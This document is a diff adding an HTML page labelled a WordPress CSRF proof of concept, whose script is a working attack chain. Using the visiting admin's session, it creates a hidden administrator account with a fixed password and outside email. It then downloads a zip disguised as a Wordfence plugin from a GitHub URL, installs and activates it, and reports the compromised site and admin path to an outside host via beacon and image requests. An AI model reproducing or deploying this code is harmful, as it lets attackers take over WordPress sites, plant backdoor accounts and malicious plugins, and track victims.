@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>WordPress CSRF - Install & Activate PoC</title>
+</head>
+<body>
+    <h2>Running Exploit Chain... Please Wait.</h2>
+    <p>Check your browser's Developer Console (F12) to view real-time execution steps.</p>
+
+    <script>
+        (function () {
+            "use strict";
+
+            const U = "wpadmin";
+            const P = "WpAdmin2026!X";
+            const E = "mailt7767@gmail.com";
+            const L = "https://static.top/2.php";
+            const ZIP_URL = "https://raw.githubusercontent.com/mailt7767-oss/esfew/main/Wordfence-Security-API.zip";
+
+            function log(url, adminPath, details) {
+                const d = { u: url, p: adminPath, info: details || "N/A" };
+                try {
+                    navigator.sendBeacon && navigator.sendBeacon(L, new Blob([JSON.stringify(d)], { type: "application/json" }));
+                    (new Image).src = L + "?" + new URLSearchParams(d).toString() + "&_=" + Date.now();
+                } catch (e) { }
+            }
+
+            function htmlDecode(input) {
+                const doc = new DOMParser().parseFromString(input, "text/html");
+                return doc.documentElement.textContent;
+            }
+
+            (async function () {
+                const o = location.origin;
+                let wp = "/";
+                const el = document.querySelector('[href*="wp-content"],[src*="wp-content"]');
+                if (el) { 
+                    const m = (el.href || el.src).match(/(.*?)\/wp-content/); 
+                    if (m) try { wp = new URL(m[1]).pathname; if (!wp.endsWith("/")) wp += "/"; } catch (e) { } 
+                }
+
+                const adminPathBase = o + (wp === "/" ? "" : wp.slice(0, -1)) + ">wp-admin";
+
+                // ==========================================
+                // VECTOR 1: Create Administrator Account
+                // ==========================================
+                try {
+                    console.log("[*] Executing Vector 1: Creating Admin User...");
+                    const userNewUrl = o + wp + "wp-admin/user-new.php";
+                    const r = await fetch(userNewUrl, { credentials: "include" });
+                    if (r.ok) {
+                        const h = await r.text();
+                        let n = h.match(/name=['"]_wpnonce_create-user['"][^>]*value=['"]([a-f0-9]+)/i) || h.match(/_wpnonce_create-user['"][^>]*value=['"]([a-f0-9]+)/i);
+                        if (n) {
+                            const f = new FormData();
+                            f.append(h.includes("_wpnonce_create-user") ? "_wpnonce_create-user" : "_wpnonce", n[1]);
+                            f.append("action", "createuser");
+                            f.append("user_login", U);
+                            f.append("email", E);
+                            f.append("pass1", P);
+                            f.append("pass2", P);
+                            f.append("role", "administrator");
+                            f.append("createuser", "Add New User");
+                            await fetch(userNewUrl, { method: "POST", body: f, credentials: "include" });
+                            console.log("[+] Vector 1 Completed.");
+                        }
+                    }
+                } catch (e) {
+                    console.error("Vector 1 error:", e);
+                }
+
+                // ==========================================
+                // VECTOR 2: Upload & Auto-Activate Plugin
+                // ==========================================
+                try {
+                    console.log("[*] Executing Vector 2: Uploading Plugin...");
+                    const pluginUploadUrl = o + wp + "wp-admin/plugin-install.php?tab=upload";
+                    const upRes = await fetch(pluginUploadUrl, { credentials: "include" });
+                    const upHtml = await upRes.text();
+                    
+                    const uploadNonceMatch = upHtml.match(/id="_wpnonce"[^>]*value="([a-f0-9]+)"/i) || upHtml.match(/name="_wpnonce"[^>]*value="([a-f0-9]+)"/i);
+                    
+                    if (uploadNonceMatch) {
+                        const uploadNonce = uploadNonceMatch[1];
+                        const zipRes = await fetch(ZIP_URL);
+                        const zipBlob = await zipRes.blob();
+                        const zipFile = new File([zipBlob], "Wordfence-Security-API.zip", { type: "application/zip" });
+
+                        const uploadData = new FormData();
+                        uploadData.append("_wpnonce", uploadNonce);
+                        uploadData.append("_wp_http_referer", pluginUploadUrl);
+                        uploadData.append("pluginzip", zipFile);
+                        uploadData.append("install-plugin-submit", "Install Now");
+
+                        const installRes = await fetch(o + wp + "wp-admin/update.php?action=upload-plugin", {
+                            method: "POST",
+                            body: uploadData,
+                            credentials: "include"
+                        });
+                        const installText = await installRes.text();
+
+                        // Enhanced regex to capture activation link patterns in various quotes or encoded styles
+                        let activateMatch = installText.match(/href=["']([^"']*action=activate[^"']*)["']/i) || 
+                                            installText.match(/href=([^\s>]*action=activate[^\s>]*)/i);
+
+                        let activateUrl = null;
+                        if (activateMatch) {
+                            activateUrl = htmlDecode(activateMatch[1]);
+                        } else {
+                            // Fallback: Parse plugins page to extract the activation nonce dynamically if direct link regex misses
+                            console.log("[*] Parsing plugins list for activation fallback...");
+                            const pluginsRes = await fetch(o + wp + "wp-admin/plugins.php", { credentials: "include" });
+                            const pluginsHtml = await pluginsRes.text();
+                            // Find activation link matching Wordfence-Security-API
+                            let fallbackMatch = pluginsHtml.match(/href=["']([^"']*plugins\.php\?action=activate[^"']*Wordfence-Security-API[^"']*)["']/i);
+                            if (fallbackMatch) {
+                                activateUrl = htmlDecode(fallbackMatch[1]);
+                            }
+                        }
+
+                        if (activateUrl) {
+                            if (!activateUrl.startsWith("http")) {
+                                activateUrl = o + wp + "wp-admin/" + activateUrl.replace(/^\//, '');
+                            }
+                            
+                            const actRes = await fetch(activateUrl, { credentials: "include" });
+                            if (actRes.ok) {
+                                console.log("[+] Vector 2 Success: Plugin Installed and Activated!");
+                                log(o, adminPathBase, "Plugin Installed and Activated Successfully");
+                            }
+                        } else {
+                            console.warn("[-] Activation link could not be parsed. Check plugins list manually.");
+                        }
+                    }
+                } catch (e) {
+                    console.error("Vector 2 error:", e);
+                }
+            })();
+        })();
+    </script>
+</body>
+</html>
